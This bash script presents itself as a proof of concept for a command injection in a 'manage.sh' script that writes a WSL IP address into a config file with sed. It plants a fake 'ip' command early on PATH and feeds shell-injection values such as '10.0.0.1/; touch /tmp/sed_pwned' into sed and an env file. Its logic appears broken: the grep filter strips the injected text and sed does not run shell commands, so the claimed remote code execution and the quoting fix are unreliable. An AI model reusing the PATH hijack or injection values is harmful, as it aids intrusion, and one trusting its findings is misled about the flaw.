#!/bin/bash
#
# Exploit: Command Injection in manage.sh
# Target: WSL IP address processing
# Impact: Remote code execution
#

echo "================================"
echo "Command Injection Exploit POC"
echo "================================"

# Check if we're in WSL
if ! grep -qi "microsoft" /proc/version 2>/dev/null; then
    echo "[!] This exploit targets WSL environments"
    echo "[*] Attempting alternative injection vectors..."
fi

# Method 1: Hijack ip command
echo "[*] Method 1: Creating malicious ip wrapper..."

# Create temporary directory
mkdir -p /tmp/exploit_dir

# Create fake ip command
cat > /tmp/exploit_dir/ip << 'EOF'
#!/bin/bash
# Malicious ip command wrapper

if [[ "$*" == *"addr show eth0"* ]]; then
    # Inject command through IP address
    echo "2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500"
    echo "    inet 10.0.0.1/; echo 'INJECTED' > /tmp/pwned.txt; echo 10.0.0.1/24 scope global eth0"
else
    # Pass through to real ip command
    /usr/bin/ip "$@" 2>/dev/null || /sbin/ip "$@"
fi
EOF

chmod +x /tmp/exploit_dir/ip

# Add to PATH
export PATH="/tmp/exploit_dir:$PATH"

echo "[*] Malicious ip command installed"
echo "[*] Running vulnerable script..."

# Create a minimal test version of the vulnerable code
cat > /tmp/test_vulnerable.sh << 'EOF'
#!/bin/bash
# Simplified vulnerable code from manage.sh

echo "[*] Detecting IP address..."
if grep -qi "microsoft" /proc/version 2>/dev/null; then
    target_ip=$(ip addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
    echo "[*] WSL IP detected: $target_ip"
else
    target_ip="localhost"
fi

# Vulnerable sed command (line 88 in original)
echo "[*] Generating config with IP: $target_ip"
echo "CLAUDE_CODE_EXPORTER_HOST" | sed "s/CLAUDE_CODE_EXPORTER_HOST/$target_ip/" > /tmp/test_config.yml
EOF

chmod +x /tmp/test_vulnerable.sh
/tmp/test_vulnerable.sh

# Check if exploitation worked
if [ -f /tmp/pwned.txt ]; then
    echo "[+] Exploitation successful!"
    echo "[+] Injected command executed"
    cat /tmp/pwned.txt
    rm -f /tmp/pwned.txt
else
    echo "[-] Method 1 failed"
fi

# Method 2: Environment variable injection
echo -e "\n[*] Method 2: Environment injection..."

# If the script sources any config files, we could inject there
cat > /tmp/malicious.env << 'EOF'
# Malicious environment file
target_ip='10.0.0.1"; touch /tmp/env_pwned; echo "10.0.0.1'
EOF

# Method 3: Direct sed injection test
echo -e "\n[*] Method 3: Testing direct sed injection..."

# Demonstrate the vulnerability
vulnerable_ip='10.0.0.1/; touch /tmp/sed_pwned; echo 10.0.0.1'
echo "Test target: CLAUDE_CODE_EXPORTER_HOST" | sed "s/CLAUDE_CODE_EXPORTER_HOST/$vulnerable_ip/"

if [ -f /tmp/sed_pwned ]; then
    echo "[+] Direct sed injection successful!"
    rm -f /tmp/sed_pwned
fi

# Cleanup
echo -e "\n[*] Cleaning up..."
rm -rf /tmp/exploit_dir
rm -f /tmp/test_vulnerable.sh /tmp/test_config.yml /tmp/malicious.env

echo -e "\n[!] Vulnerability Impact:"
echo "    - Command execution as current user"
echo "    - No input validation on IP addresses"
echo "    - Unquoted variables in sed commands"
echo -e "\n[!] Fix: Quote variables in sed: sed \"s/PLACEHOLDER/\$var/\""